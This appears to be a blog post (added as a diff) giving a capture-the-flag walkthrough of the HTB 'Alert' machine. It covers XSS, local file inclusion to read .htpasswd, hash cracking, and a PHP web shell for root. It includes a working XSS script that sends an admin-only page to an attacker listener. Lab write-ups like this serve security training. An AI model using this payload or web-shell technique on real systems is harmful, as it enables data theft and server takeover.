@@ -1,0 +1,116 @@
+---
+layout: post
+title: "Alert 14eb9525529180c9b200f28db6068308"
+date:   2025-07-15 12:05:57 -0400
+categories: writeups
+---
+
+# Alert
+
+# 1. Enumeration
+
+Start enumerating ports, there is a web application running, and a ssh service we may need to find some creds
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image.png' | relative_url }})
+
+We can perform some actions like, view a .md file, exploring the web application there is a message suggesting report any trouble through contact us 
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_1.png' | relative_url }})
+
+# 2. User flag
+
+Let’s keep enumerating the machine listing directories, there is another one called messages, if we try to send a request to it it doesn’t show anything it may be allowed to show info only to admin
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_2.png' | relative_url }})
+
+Messages is also present in here
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_3.png' | relative_url }})
+
+We tried to upload js code to perform a xss attack, it seems to be vulnerable to it but there are no cookies to steal and we are not able to do anything else different from share the .md file, so we could attempt to fetch files as whoever is behind contact us and send that information to a listener we will set up
+
+```jsx
+<script>
+fetch("http://alert.htb/index.php?page=messages")
+	.then(response => response.text())
+	.then(data => {
+	fetch("http:/0.0.0.0:0000/?data=" + encodeURIComponent(data));
+	})
+	.catch(error => console.error("Error", error));
+</script>
+```
+
+Send the payload but before clicking it in share, intercept the request, copy and paste the link and send it to contact us interface
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_4.png' | relative_url }})
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_5.png' | relative_url }})
+
+It will be sent successfully
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_6.png' | relative_url }})
+
+And we will receive the info in the netcat listener
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_7.png' | relative_url }})
+
+Decode it using cyberchef, there is a .txt file on it and it is disclosing the way to access files with messages php script, there may be a LFI 
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_8.png' | relative_url }})
+
+There is a Apache2 server running
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_9.png' | relative_url }})
+
+Check default configuration files
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_10.png' | relative_url }})
+
+It give us the whole configurations and the file where a password is stored
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_11.png' | relative_url }})
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_12.png' | relative_url }})
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_13.png' | relative_url }})
+
+Check the content on .htpasswd
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_14.png' | relative_url }})
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_15.png' | relative_url }})
+
+Albert hash found
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_16.png' | relative_url }})
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_17.png' | relative_url }})
+
+Log in as Albert and  get user flag
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_18.png' | relative_url }})
+
+# 3.Priv esc
+
+To escalate privileges we found in `/opt/website-monitor` files that seems to run a web application, root is the owner but management group can performs some tasks in config files
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_19.png' | relative_url }})
+
+Effectively we are part of management group
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_20.png' | relative_url }})
+
+And there is a local service running on port 8080
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_21.png' | relative_url }})
+
+We could forward that port to get more information of this, but i think that we have the necessary to elevate our privileges, furthermore we have the base path where files are requested
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_22.png' | relative_url }})
+
+1. Create a new .php file opening the door to get requests executing commands
+2. Make a request executing whatever command we want through the file we’ve created previously
+
+![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_23.png' | relative_url }})
+
+Machine Pwned!!!
